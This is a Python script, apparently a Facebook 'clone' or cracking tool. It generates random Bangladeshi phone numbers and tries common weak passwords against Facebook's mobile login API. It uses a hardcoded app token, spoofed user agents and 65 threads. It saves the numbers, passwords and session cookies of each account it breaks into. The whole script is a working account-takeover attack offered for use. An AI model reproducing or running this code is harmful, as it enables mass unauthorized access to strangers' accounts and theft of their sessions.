import os, time, random, string, re, sys, requests, json, uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# VIP GOLD Colors
A = '\033[1;97m' # White
R = '\033[1;91m' # Red
G = '\033[1;92m' # Neon Green
Y = '\033[1;93m' # Gold
S = '\033[1;96m' # Sky Blue

# Global Counters
loop, oks, cps = 0, [], []

def line():
    print(f'{S}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{A}')

def logo():
    os.system('clear')
    print(f'''{Y}
 ███████ ██   ██  █████  ██   ██ ██ ███    ██ 
 ██      ██   ██ ██   ██ ██   ██ ██ ████   ██ 
 ███████ ███████ ███████ ███████ ██ ██ ██  ██ 
      ██ ██   ██ ██   ██ ██   ██ ██ ██  ██ ██ 
 ███████ ██   ██ ██   ██ ██   ██ ██ ██   ████ {A}''')
    line()
    print(f' {A}[{G}•{A}] OWNER      : SHAHIN BIN AHMED')
    print(f' {A}[{G}•{A}] VERSION    : {Y}VIP GOLD (ULTRA){A}')
    print(f' {A}[{G}•{A}] STATUS     : {G}LIFETIME ACTIVATED{A}')
    line()

def Main():
    logo()
    print(f' [1] BANGLADESH RANDOM CLONE {Y}(FAST){A}')
    print(f' [2] PAKISTAN RANDOM CLONE {Y}(FAST){A}')
    print(f' [3] INDIA RANDOM CLONE {Y}(FAST){A}')
    print(f' [0] EXIT TOOL')
    line()
    choice = input(f' {A}[{G}•{A}] CHOICE : {G}')
    if choice in ['1', '01']: bd_menu()
    elif choice == '0': exit()
    else: Main()

def bd_menu():
    logo()
    print(f' [•] CODES: 017, 018, 019, 013, 016')
    code = input(f' [+] SELECT CODE : {G}')
    limit = int(input(f' [•] CRACK LIMIT : {G}'))
    
    with ThreadPool(max_workers=65) as gold:
        logo()
        print(f' [•] TOTAL TARGET : {limit}')
        print(f' [•] CLONING IS RUNNING... {Y}(VIP){A}')
        line()
        for _ in range(limit):
            num = ''.join(random.choice(string.digits) for _ in range(8))
            uid = code + num
            # VIP SMART PASSWORDS
            pws = [uid, num, uid[:6], uid[:7], uid[:8], '123456', '1234567', '12345678', '123456789', 'shahin123', 'shahin786']
            gold.submit(vip_engine, uid, pws, limit)

def vip_engine(uid, pws, limit):
    global loop
    # VIP USER AGENTS
    ua_vip = [
        f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,17)}_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (Linux; Android {random.randint(11,14)}; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android {random.randint(10,13)}; Redmi Note 13 Pro+) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
    ]
    ua = random.choice(ua_vip)
    
    for pw in pws:
        session = requests.Session()
        headers = {
            'User-Agent': ua,
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-HTTP-Engine': 'Liger'
        }
        data = {
            'adid': str(uuid.uuid4()),
            'email': uid,
            'password': pw,
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'generate_session_cookies': '1'
        }
        try:
            url = 'https://b-graph.facebook.com/auth/login'
            response = session.post(url, data=data, headers=headers).json()
            if 'session_key' in response:
                coki = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                print(f'\r\r{G}[SHAHIN-OK] {uid} | {pw}{A}')
                print(f'{Y}[COOKIE] {A}{coki}')
                os.system('espeak -a 300 "Shahin, One OK ID Found"')
                open('/sdcard/SHAHIN-GOLD-OK.txt', 'a').write(f'{uid}|{pw}|{coki}\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in str(response):
                cps.append(uid)
                break
        except:
            pass
    loop += 1
    sys.stdout.write(f'\r\r {A}[CLONING] {loop}/{limit} OK:{G}{len(oks)}{A} CP:{Y}{len(cps)}{A} '); sys.stdout.flush()

if __name__ == "__main__":
    Main()
